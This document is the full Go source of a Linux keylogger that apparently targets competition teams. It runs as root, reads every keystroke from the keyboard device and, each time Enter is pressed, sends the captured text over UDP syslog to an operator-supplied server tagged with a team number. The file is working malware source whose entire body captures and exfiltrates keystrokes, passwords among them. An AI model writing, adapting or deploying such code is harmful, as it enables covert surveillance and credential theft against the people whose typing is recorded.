package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"time"
	"unicode"

	"github.com/MarinX/keylogger"
	syslog "github.com/NextronSystems/simplesyslog"
)

var syslogServerIP *string
var syslogServerPort *string
var teamNumber *string

var shiftCharacters = map[uint16]string{
	2: "!", 3: "@", 4: "#", 5: "$", 6: "%", 7: "^", 8: "&",
	9: "*", 10: "(", 11: ")", 12: "_", 13: "+", 26: "{", 27: "}",
	39: ":", 40: "\"", 41: "*", 43: "|", 51: "<", 52: ">", 53: "?",
}

func main() {
	var recordedKeys []string
	var newKey string
	var keypressTimer int64
	var keyreleaseTimer int64
	var keyreleaseDifference int64
	var keyRepeat int
	var capitalized bool = false

	if os.Geteuid() != 0 {
		log.Fatal("Needs to be run as root")
	}

	// Parse command-line flags
	syslogServerIP = flag.String("s", "", "Server IP")
	syslogServerPort = flag.String("p", "", "Server port")
	teamNumber = flag.String("t", "", "Team number")
	flag.Parse()

	if *syslogServerIP == "" || *syslogServerPort == "" {
		log.Fatal("Must specify server IP with the -s flag and port with -p. Use -h for help.")
	} else if *teamNumber == "" {
		log.Fatal("Specify a team number with the -t flag.")
	}

	// Find the keyboard and start listening for events
	keyboardDevice := keylogger.FindKeyboardDevice()
	newKeylogger, _ := keylogger.New(keyboardDevice)

	events := newKeylogger.Read()

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:

			// Handle key presses
			if e.KeyPress() {

				// Track capitalization and get a keypress timestamp
				if e.KeyString() == "L_SHIFT" || e.KeyString() == "R_SHIFT" {
					capitalized = true
				} else {
					keypressTimer = time.Now().UnixMilli()
				}
			}

			// Handle key releases
			if e.KeyRelease() {

				// Determine how many characters to print
				keyreleaseTimer = time.Now().UnixMilli()

				// Handle the case of an orphan key press or release event
				if keyreleaseTimer == 0 || keypressTimer == 0 {
					continue
				}

				keyreleaseDifference = keyreleaseTimer - keypressTimer

				// Calculate how many characters to print
				if (keyreleaseDifference / 500) != 0 {
					keyRepeat = int(((keyreleaseDifference - 500) / 50) + 1)
				}

				// Send keystrokes home on enter
				if e.KeyString() == "ENTER" {
					go sendToSyslog(recordedKeys)
					recordedKeys = nil
					continue
				} else if e.KeyString() == "L_SHIFT" || e.KeyString() == "R_SHIFT" {
					capitalized = false
				} else if capitalized {
					// Distinguish between special characters and letters for capitalization
					if !unicode.IsLetter([]rune(e.KeyString())[0]) {
						newKey = shiftCharacters[e.Code]
					} else {
						newKey = e.KeyString()
					}
				} else {
					newKey = strings.ToLower(e.KeyString())
				}

				// If the key was held, multiply characters
				if keyRepeat > 0 {
					for i := 1; i <= (keyRepeat + 1); i++ {
						recordedKeys = append(recordedKeys, newKey)
					}
				} else {
					recordedKeys = append(recordedKeys, newKey)
				}
				keyRepeat = 0
			}
		}
	}
}

func sendToSyslog(recordedKeys []string) {

	var finalString string
	var backspacesChain int
	var erasedIndex int

	// Replace backspaces with strikethrough
	for i, character := range recordedKeys {
		if character == "bs" {
			erasedIndex = (2 * backspacesChain) + 1
			if (i - erasedIndex) >= 0 {
				recordedKeys[i-erasedIndex] = "~~" + recordedKeys[i-erasedIndex] + "~~"
				backspacesChain += 1
			}
		} else {
			backspacesChain = 0
		}
	}

	// Remove all backspaces out of the slice and replace spaces
	for _, key := range recordedKeys {
		if key != "bs" {
			if len(key) != 1 {
				if strings.Contains(key, "space") {
					if strings.HasPrefix(key, "~~") {
						finalString = finalString + "~~ ~~"
					} else {
						finalString = finalString + " "
					}
				} else if strings.HasPrefix(key, "~~") {
					finalString = finalString + key
				} else {
					finalString = finalString + "[" + key + "]"
				}
			} else {
				finalString = finalString + key
			}
		}
	}

	// Establish connection with the server
	syslogServerSocket := *syslogServerIP + ":" + *syslogServerPort
	syslogClient, err := syslog.NewClient(syslog.ConnectionUDP, syslogServerSocket, &tls.Config{})

	// Send the recorded keystrokes
	if err != nil {
		log.Println("Cannot establish connection with server - " + fmt.Sprint(err))
	} else {
		if err := syslogClient.Send(*teamNumber+" "+finalString, syslog.LOG_USER|syslog.LOG_DEBUG); err != nil {
			fmt.Println("Warning: Cannot send message to syslog - " + fmt.Sprint(err))
		}
	}
}
